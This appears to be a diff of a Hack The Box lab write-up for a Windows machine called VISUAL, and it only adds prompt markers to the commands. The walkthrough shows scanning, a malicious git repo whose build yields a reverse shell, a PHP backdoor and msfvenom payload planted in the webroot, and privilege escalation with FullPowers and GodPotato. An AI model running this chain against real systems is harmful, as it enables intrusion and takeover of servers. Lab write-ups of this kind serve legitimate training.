@@ -4,7 +4,7 @@
 ### PHASE 1. Service enumeration
 Launch a port scan with `nmap`
 ```markdown
-nmap $target -p- -T4 -Pn --open --reason
+> nmap $target -p- -T4 -Pn --open --reason
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-02 06:42 EDT
 Stats: 0:04:21 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
 Nmap scan report for 10.129.131.71
@@ -18,7 +18,7 @@ Nmap done: 1 IP address (1 host up) scanned in 495.11 seconds
 ```
 Scan the open services
 ```markdown
-nmap $target -p80 -sV -sC -Pn -v      
+> nmap $target -p80 -sV -sC -Pn -v      
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-02 06:53 EDT
 Nmap scan report for 10.129.131.71
 Host is up (0.15s latency).
@@ -41,16 +41,16 @@ So there is an Apache 2.4.56 web server running on port 80. We inspect the site 
 ### PHASE 2. User
 Our goal is to prepare a local http git repo serving a visual studio solution. For this, we start making a directory called `repo` and create a new visual studio solution called `repo.sln`
 ```markdown
-mkdir repo
+> mkdir repo
 
-cd repo
+> cd repo
 
-dotnet new sln -n repo
+> dotnet new sln -n repo
 The template "Solution File" was created successfully.
 ```
 From the `repo` directory, create a new project (specifically, a console c# app) called `myapp`
 ```markdown
-dotnet new console -o myapp
+> dotnet new console -o myapp
 The template "Console App" was created successfully.
 Processing post-creation actions...
 Running 'dotnet restore' on /home/kali/htb/repo/myapp/myapp.csproj...
@@ -60,21 +60,21 @@ Running 'dotnet restore' on /home/kali/htb/repo/myapp/myapp.csproj...
 ```
 This will generate a new folder called `myapp` containing a project file called `myapp.csproj` and a c# source file called `Program.cs`. Finally, we add the c# project to the visual studio solution.
 ```markdown
-dotnet sln repo.sln add myapp/myapp.csproj
+> dotnet sln repo.sln add myapp/myapp.csproj
 Project `myapp/myapp.csproj` added to the solution.
 ```
 Once visual studio part is finished, we need to initialize a git repository in the `repo` directory and serve it via http. For this, firstly initialize the git repo on directory `repo`
 ```markdown
-cd repo
-git init
+> cd repo
+> git init
 ```
 The directory `repo/.git` is created after this. The `.git` directory contains the repo files and metadata. Next step is to add all files on the `repo` directory to the git
 ```markdown
-git add .
+> git add .
 ```
 Check there no more untracked files in the git repo to be added
 ```markdown
-git status
+> git status
 On branch master
 
 No commits yet
@@ -92,7 +92,7 @@ Changes to be committed:
 ```
 Commit changes
 ```markdown
-git commit -m 'first commit'
+> git commit -m 'first commit'
 
  8 files changed, 254 insertions(+)
  create mode 100644 myapp/Program.cs
@@ -106,13 +106,13 @@ git commit -m 'first commit'
 ```markdown
 Finally, move to .git directory and update server info
 ```markdown
-git update-server-info
+> git update-server-info
 ```
 Now the git is ready to be served on http. We can test it, move to `.git` and serve the repo with a python http server. Then, in the web app, enter the local machine ip. Shortly after, the app starts downloading the c# files and uploading them into the server. Once they are conmplied, they are stored in a random folder and the app supplies the user with the resulting url 
 ```markdown
-cd .git 
+> cd .git 
                                                                                                                                  
-python3 -m http.server 80
+> python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 10.129.131.71 - [02/Oct/2023 06:35:21] "GET /info/refs?service=git-upload-pack HTTP/1.1" 200 -
@@ -154,12 +154,12 @@ Once we are sure our git repo works, we have to find a way to make the server ex
 ```
 After this, add again all files to git, commit, update server info and restart the python http server (from .git directory)
 ```markdown
-cd repo
-git add .
-git commit -m 'commit'
-cd .git
-git update-server-info
-python3 -m http.server 80
+> cd repo
+> git add .
+> git commit -m 'commit'
+> cd .git
+> git update-server-info
+> python3 -m http.server 80
 ```
 Start another python http serving powercat.ps1 and start a listener. Enter red box ip in the web app url box, after the c# files are pulled and processed, a reverse shell is received on port 1919
 <br>
@@ -167,7 +167,7 @@ Start another python http serving powercat.ps1 and start a listener. Enter red b
 ### PHASE 3. System
 Enumerate the system.
 ```markdown
-systeminfo
+> systeminfo
 
 Host Name:                 VISUAL
 OS Name:                   Microsoft Windows Server 2019 Standard
@@ -176,7 +176,7 @@ System Type:               x64-based PC
 ```
 Enumerate current user privileges.
 ```markdown
-whoami /priv
+> whoami /priv
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -189,7 +189,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 ```
 After enumeration, we discover we have write access to webroot folder so if we copy a .php shell in the webroot, we could move laterally to the user who is running the web server. Let's check who is running the http service
 ```markdown
-wmic service where started=true get name,startname
+> wmic service where started=true get name,startname
 
 Name                    StartName                    
 ApacheHTTPServer        NT AUTHORITY\Local Service   
@@ -201,10 +201,10 @@ CDPSvc                  NT AUTHORITY\LocalService
 The user is `ApacheHTTPServer`, who is `nt authority\local service`. Copy a `simple-backdoor.php` and a `.exe` msfvenom payload into the webroot folder (download with certutil). Then start a listener and execute the `.exe` payload server side using a browser and the `simple-backdoor.php`. A reverse shell for user `nt authority\local service` is received on the listener.
 Enumerate ApacheHTTPService user's permissions
 ```markdown
-whoami
+> whoami
 nt authority\local service
 
-whoami /priv
+> whoami /priv
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -217,7 +217,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 ```
 It's the same as before, seems we have not progressed so much; however, there is a tool which restores original privileges (including impersonation) to local services account. Download and use `fullpowers.exe` on local service account, verify impersonation privilege is restored aftwerwards.
 ```markdown
-fp.exe
+> fp.exe
 [+] Started dummy thread with id 2388
 [+] Successfully created scheduled task.
 [+] Got new token! Privilege count: 7
@@ -225,7 +225,7 @@ fp.exe
 Microsoft Windows [Version 10.0.17763.4851]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
-whoami /priv
+> whoami /priv
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -242,7 +242,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
 ```
 Once we have impersonation privilege restored, we can try all range of potatoes. The one working is god potato. We need another msfvenom shell to execute with god potato.
 ```markdown
-godpotato-net4.exe -cmd "cmd /c shell.exe"
+> godpotato-net4.exe -cmd "cmd /c shell.exe"
 [*] CombaseModule: 0x140716178145280
 [*] DispatchTable: 0x140716180451440
 [*] UseProtseqFunction: 0x140716179827616
